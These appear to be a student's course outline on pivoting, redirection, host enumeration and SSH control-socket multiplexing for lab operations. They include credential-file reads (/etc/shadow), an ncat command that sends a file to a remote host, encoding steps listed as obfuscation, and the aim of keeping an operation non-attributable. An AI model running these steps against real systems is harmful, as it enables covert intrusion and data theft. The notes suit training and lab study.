 - Pivoting and Redirection
    - Control sockets
    - Enumeration
    - Exfiltration
    - What is pivoting? Why is it important?
       - Makes the op non attributable
       - Looks like your connection is coming from another location
       - Allows access to something that we may nor hav direct access to due to firewalls, routers, etc.
       - Can make or break an operation,connection loss,malware,active admin,unreliable,etc.
       - Reliability, the pivot machine will be directly accessed, and COULD be attributable 
         if the proper precautions aren’t taken (encryption, VMs, nat and pat)
    - What is a system used for redirection?
       - A remote machine that is very trustworthy and reliable, used to pivot from
    - How much thought should be put into selecting a system for redirection?
       - Geographical Location
       - State of the machine
       - Uptime
       - Basically it’s overall reliability
    - Command demo Linux 
       - cat /etc/passwd
          - username:hashed password:userid:group userid:comments:homedir:default shell
       - cat /etc/shadow
          - contains encrypted user password
       - last
          - displays information about the last user to logon
       - who
          - displays who is currently logged on
       - whoami
          - shows who you are currently logged in as
       - groups
          - displays what groups the user is part of
       - id
          - pulls up uid,guid,and groups for the user who ran the command
       - ps -elf
          - displays current running processes in long format
          - -aux
             - gives us the process tree
       - pstree
          - gives the process listing in a tree format
       - sudo lsof
          - list of open files on the system
       - chkconfig
          - SysV
       - systemctl list-units --type=service
          - SystemD service listings
          - adding a "| grep running" will list only running services
       - ifconfig -a
          - same as ip a but a little bit easier to read
       - netstat
          - list connections to a machine
       - arp -an
          - allows us to view the arp cache
       - ip route
          - gives us our routing table
          - route
             - does the same thing
          - netstat -r
             - does the same thing
       - cat /proc/cpuinfo
          - gives us information about the cpu
       - lsmod
          - lists kernel modules
       - cat <file> | tr 'a-zA-Z0-9' 'b-zA-Z0-9a' > shifted.txt
          - shifts the characters in the file and saves it to a different file
       - cat file | base64
          - converts the file to base64 encryption
       - scp <source> <destination>
       - ncat --ssl <ip> <port> < <file>
    - Command demo Windows
       - net user
          - Shows users on the box
       - get-localuser
          - Shows users on the box PS
       - get-localgroup
          - Shows all the groups on the box PS
       - get-localuser | get-member
          - shows what we can do with the output with select PS
       - tasklist /v
          - shows running processes
       - get-process
          - shows running processes PS
       - get-process | where {$_.sessionid -eq 1}
       - tasklist /svc
          - shows services
       - get-service | where {$_.status -eq "running"}
          - shows services that are running PS
       - net start
          - shows startup services
       - wmic service list status
          - running services CMD
       - ipconfig /all
          - view info about the NICs
       - netstat -anob
          - all listening ports
       - wmic net use list
          - CMD
       - net view
          - CMD
       - arp -a
          - displays the ARP cache
       - route print
          - prints the routing table
       - systeminfo
          - gives a lot of info about the box
       - date
          - allows us to enumerate where the pc is
       - obfuscation
          - type <file> | %{$_ -replace 'a','b' -replace 'b','c' -replace 'c', 'd'} > translated.out
          - certutil -encode <file> encoded.b64
 - SSH Multiplexing
    - cd .ssh
    - mkdir cm or cd to cm
    - ssh -M -S ~/.ssh/cm/student@10.50.38.18:22 student@10.50.38.18
       - the -M is the master -S is the slave/socket the filename is the connection
    - ssh -M -S ~/.ssh/cm/grey -o "ControlPersist=10m" student@10.50.38.18
    - ssh -S ~/.ssh/cm/grey greyhost
    - ssh -O forward -L1111:10.100.28.48:80 -S ~/.ssh/cm/gray nla
    - ssh -O forward -L2222:10.100.28.40:80 -S ~/.ssh/cm/gray another
    - ssh -O cancel -L1111:10.100.28.48:80 -S ~/.ssh/cm/gray nla
       - clears the connection
   - ssh -O cancel -S ~/.ssh/cm/gray another
      - gracefully closes the socket
   - ssh -O exit ~/.ssh/cm/gray another(placeholder)
      - closes the connection
   - ssh -O forward -L2222:192.168.28.111:2222 -S ~/.ssh/cm/grey placeholder
   - ssh -M -S ~/.ssh/cm/T1 comrade@0.0.0.0 -p2222 # creates a master socket to the original slave
   - scp -o "ControlPath=~/.ssh/cm/grey" a:/home/student/func .
   - ssh -S ~/.ssh/cm/grey 01 -D 9050
       
       
       
       





